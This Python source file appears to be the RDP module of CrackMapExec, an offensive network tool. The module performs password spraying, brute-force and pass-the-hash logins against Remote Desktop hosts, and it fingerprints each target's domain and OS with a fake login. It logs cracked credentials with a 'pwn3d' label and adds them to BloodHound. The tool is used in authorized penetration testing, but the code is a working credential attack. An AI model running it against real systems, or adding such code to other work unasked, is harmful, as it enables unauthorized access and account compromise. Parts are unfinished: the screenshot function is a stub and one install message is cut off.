import logging
import asyncio
from cme.connection import *
from cme.helpers.logger import highlight
from cme.logger import CMEAdapter

try:
    from aardwolf import logger
    from aardwolf.commons.url import RDPConnectionURL
    from aardwolf.commons.iosettings import RDPIOSettings
    from aardwolf.protocol.x224.constants import SUPP_PROTOCOLS
except ImportError:
    print("aardwolf librairy is missing, you need to install the submodule")
    print("run the command: ")
    exit()

logger.setLevel(logging.WARNING)

rdp_error_status = {
    '-1073741711': 'STATUS_PASSWORD_EXPIRED'
}

class rdp(connection):

    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.iosettings = RDPIOSettings()
        self.iosettings.supported_protocols = SUPP_PROTOCOLS.HYBRID_EX
        self.output_filename = None
        self.domain = None
        self.server_os = None

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        rdp_parser = parser.add_parser('rdp', help="own stuff using RDP", parents=[std_parser, module_parser])
        rdp_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        rdp_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
        rdp_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
        rdp_parser.add_argument("--port", type=int, default=3389, help="Custom RDP port")
        rdp_parser.add_argument("--rdp-timeout", type=int, default=1, help="RDP timeout on socket connection")
        dgroup = rdp_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, default=None, help="domain to authenticate to")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')

        egroup = rdp_parser.add_argument_group("Screenshot", "Remote Desktop Screenshot")
        egroup.add_argument("--screenshot", action="store_true", help="Screenshot RDP if connection success")

        return parser

    def proto_flow(self):
        if self.create_conn_obj():
            self.proto_logger()
            self.print_host_info()
            if self.login():
                if hasattr(self.args, 'module') and self.args.module:
                    self.call_modules()
                else:
                    self.call_cmd_args()

    def proto_logger(self):
        self.logger = CMEAdapter(extra={'protocol': 'RDP',
                                        'host': self.host,
                                        'port': '3389',
                                        'hostname': self.hostname})

    def print_host_info(self):
        self.logger.info(u"{} (name:{}) (domain:{})".format(self.server_os,
                                                            self.hostname,
                                                            self.domain))

    def create_conn_obj(self):
        try:
            asyncio.run(self.connect_rdp('rdp+ntlm-password://FAKE\\user:pass@' + self.host))
        except OSError:
            return False
        except Exception as e:
            info_domain = self.conn.get_extra_info()
            self.domain    = info_domain['dnsdomainname']
            self.hostname  = info_domain['computername']
            self.server_os = info_domain['os_guess'] + " Build " + str(info_domain['os_build'])

            self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))
            self.output_filename = self.output_filename.replace(":", "-")

            if self.args.domain:
                self.domain = self.args.domain
            
            if self.args.local_auth:
                self.domain = self.hostname

            return True

    async def connect_rdp(self, url):
        rdpurl = RDPConnectionURL(url)
        self.conn = rdpurl.get_connection(self.iosettings)
        _, err = await self.conn.connect()
        if err is not None:
            raise err
        return True

    def plaintext_login(self, domain, username, password):     
        try:
            url = 'rdp+ntlm-password://' + domain + '\\' + username + ':' + password + '@' + self.host
            asyncio.run(self.connect_rdp(url))
            self.admin_privs = True
            self.logger.success(u'{}\\{}:{} {}'.format(self.domain,
                                                        username,
                                                        password,
                                                        highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else '')))
            if not self.args.local_auth:
                add_user_bh(username, domain, self.logger, self.config)
            if not self.args.continue_on_success:
                return True

        except Exception as e:
            reason = None
            for word in rdp_error_status.keys():
                if word in str(e):
                    reason = rdp_error_status[word]
            
            self.logger.error(u'{}\\{}:{} {}'.format(self.domain,
                                                    username,
                                                    password,
                                                    '({})'.format(reason) if reason else ''),
                                                    color='magenta' if (reason or "CredSSP" not in str(e)) else 'red')
            return False

    def hash_login(self, domain, username, ntlm_hash):
        try:
            url = 'rdp+ntlm-nt://' + domain + '\\' + username + ':' + ntlm_hash + '@' + self.host
            asyncio.run(self.connect_rdp(url))

            self.admin_privs = True
            self.logger.success(u'{}\\{}:{} {}'.format(self.domain,
                                                       username,
                                                       ntlm_hash,
                                                       highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else '')))
            if not self.args.local_auth:
                add_user_bh(username, domain, self.logger, self.config)            
            if not self.args.continue_on_success:
                return True

        except Exception as e:
            reason = None
            for word in rdp_error_status.keys():
                if word in str(e):
                    reason = rdp_error_status[word]
            
            self.logger.error(u'{}\\{}:{} {}'.format(self.domain,
                                                    username,
                                                    ntlm_hash,
                                                    '({})'.format(reason) if reason else ''),
                                                    color='magenta' if (reason or "CredSSP" not in str(e)) else 'red')

            return False

    def screenshot(self):
        print("screenshot")
